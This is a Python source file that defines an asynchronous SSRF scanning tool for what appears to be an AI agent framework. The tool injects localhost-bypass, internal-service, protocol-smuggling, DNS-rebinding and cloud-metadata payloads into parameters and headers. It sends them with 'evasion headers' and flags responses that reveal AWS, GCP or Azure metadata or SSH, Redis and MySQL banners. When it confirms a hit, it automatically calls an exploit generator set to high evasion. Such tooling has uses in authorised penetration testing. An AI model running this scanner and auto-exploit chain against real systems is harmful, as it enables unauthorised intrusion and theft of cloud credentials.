import urllib.parse
from src.sdk.tool import function_tool
from .common import _get_evasion_headers, async_fetch_all, register_appsec_vulnerability, SSRF_PAYLOADS_ADVANCED


# ─── SSRF  (Server-Side Request Forgery) ─────────────────────────────────────────

@function_tool()
async def ssrf_scanner(url: str, parameter: str = "", 
                 test_internal: bool = True, test_cloud: bool = True,
                 custom_target: str = "", data_params: str = "",
                 method: str = "GET", headers_inject: bool = False) -> str:
    """
    Scan for Server-Side Request Forgery (SSRF) and bypasses (Async Engine).
    Tests URL and POST data for internal service access, cloud metadata, and OAST endpoints.
    
    Args:
        url: Target URL
        parameter: Parameter to test (supports GET or POST bodies)
        test_internal: Test internal service access and bypasses
        test_cloud: Test cloud metadata endpoints
        custom_target: Custom SSRF target (like an OAST domain)
        data_params: POST body data (e.g., 'param=val')
        method: HTTP method (GET or POST)
        headers_inject: Test SSRF via headers (Referer, Host, X-Forwarded-For)
    
    Returns:
        SSRF scan results
    """
    
    results = []
    parsed = urllib.parse.urlparse(url)
    get_params = dict(urllib.parse.parse_qsl(parsed.query))
    post_params = dict(urllib.parse.parse_qsl(data_params)) if data_params else {}
    
    if not parameter and not headers_inject:
        return "Must provide a parameter to test or enable headers_inject."

    results.append(f"## SSRF Scan (Async Engine) for {parsed.netloc}")
    if parameter: results.append(f"Testing parameter: {parameter}\n")
    if headers_inject: results.append("Testing Header injections\n")
    
    payloads = []

    if test_internal:
        for _u in SSRF_PAYLOADS_ADVANCED["localhost_bypass"]:
            payloads.append((_u, f"Localhost bypass: {_u}"))
        for _u in SSRF_PAYLOADS_ADVANCED["internal_services"]:
            payloads.append((_u, f"Internal service: {_u}"))
        for _u in SSRF_PAYLOADS_ADVANCED["protocol_smuggling"]:
            payloads.append((_u, f"Protocol smuggling: {_u}"))
        for _u in SSRF_PAYLOADS_ADVANCED["dns_rebinding"]:
            payloads.append((_u, f"DNS rebinding: {_u}"))

    if test_cloud:
        for _provider, _urls in SSRF_PAYLOADS_ADVANCED["cloud_metadata"].items():
            for _u in _urls:
                payloads.append((_u, f"{_provider.upper()} Metadata"))

    if custom_target:
        payloads.append((custom_target, "Custom/OAST target (Check outside tool)"))
    
    base_headers = _get_evasion_headers()
    
    # ── Formulate Requests ──
    async_requests = []
    
    for payload, description in payloads:
        test_get = get_params.copy()
        test_post = post_params.copy()
        req_headers = base_headers.copy()
        
        if parameter:
            if parameter in test_get: test_get[parameter] = payload
            elif parameter in test_post: test_post[parameter] = payload
            else: test_get[parameter] = payload
            
        if headers_inject:
            req_headers["Referer"] = payload
            req_headers["X-Forwarded-For"] = payload
            req_headers["Host"] = urllib.parse.urlparse(payload).netloc or payload
            
        test_query = urllib.parse.urlencode(test_get)
        req_url = urllib.parse.urlunparse(parsed._replace(query=test_query))
        
        req = {
            "method": method.upper(),
            "url": req_url,
            "headers": req_headers,
            "_payload": payload,
            "_desc": description
        }
        
        if method.upper() == "POST" or (parameter in test_post):
            req["method"] = "POST"
            req["data"] = test_post
            
        async_requests.append(req)
        
    results.append(f"🚀 Launching async swarm for {len(async_requests)} SSRF payloads...")
    scan_results = await async_fetch_all(async_requests, max_concurrent=20, timeout_sec=10)
    
    vulnerable = []
    
    indicators = [
        "ami-", "instance-id", "local-hostname",  # AWS
        "computeMetadata", "project-id",  # GCP
        "vmId", "subscriptionId",  # Azure
        "SSH-", "OpenSSH",  # SSH banner
        "redis_version", "+OK",  # Redis
        "MySQL", "MariaDB",  # MySQL
    ]
    
    for res in scan_results:
        req_meta = res["req"]
        desc = req_meta["_desc"]
        payload = req_meta["_payload"]
        
        if res["error"]:
            if "port" in desc or "SSH" in desc or "Redis" in desc:
                results.append(f"  ℹ️ {desc}: Timeout (Port might be open/filtered)")
            continue
            
        text = res["text"]
        
        found = False
        for indicator in indicators:
            if indicator.lower() in text.lower():
                vulnerable.append({
                    "payload": payload,
                    "description": desc,
                    "evidence": indicator
                })
                found = True
                break
                
        if not found and len(text) > 500 and "404" not in text and "error" not in text.lower():
            results.append(f"  ℹ️ {desc}: Large response ({len(text)} bytes) - investigate manually!")

    # Summary
    results.append("\n## Summary")
    if vulnerable:
        results.append(f"🔴 Found {len(vulnerable)} SSRF vulnerabilities!")
        
        for vuln in vulnerable:
            results.append(f"  - {vuln['description']}")
            results.append(f"    Payload: {vuln['payload']}")
            results.append(f"    Evidence: {vuln['evidence']}")
            
            await register_appsec_vulnerability(
                target_url=url,
                vuln_type="Server-Side Request Forgery (SSRF)",
                severity="CRITICAL",
                parameter=parameter if parameter else "Headers",
                payload=vuln['payload'],
                evidence=vuln['evidence']
            )
            
        # ── Auto-Exploit Chaining ─────────────────────────────────────
        results.append("\n## Autonomous Exploit Generation")
        try:
            from src.tools.exploit_craft import generate_exploit_code
            
            context_str = f"Target URL: {url}\nMethod: {method}\nParameter: {parameter}\nHeaders Inject: {headers_inject}\n\nConfirmed Vulnerabilities:\n"
            for v in vulnerable[:2]:
                context_str += f"- {v['description']}: Found '{v['evidence']}'\nPayload: {v['payload']}\n"
            
            exploit_result = await generate_exploit_code.invoke(
                vuln_type="Server-Side Request Forgery (SSRF)",
                target_tech="Unknown Web Application",
                context=context_str,
                evasion_level="high",
                language="python"
            )
            
            results.append("✅ Auto-Exploit successfully generated and saved:")
            results.append("\n".join(exploit_result.split("\n")[:10]) + "\n...")
        except ImportError:
            results.append("⚠️ Exploit engine (exploit_craft) not available in this build.")
        except Exception as e:
            results.append(f"⚠️ Exploit generation failed: {str(e)[:100]}")
            
    else:
        results.append("✅ No obvious SSRF detected via reflection. If using OAST `custom_target`, check your logs for blind hit!")
    
    results.append("\n💡 Tips: Try DNS rebinding via dynamic services or different protocol wrappers.")
    
    return "\n".join(results)
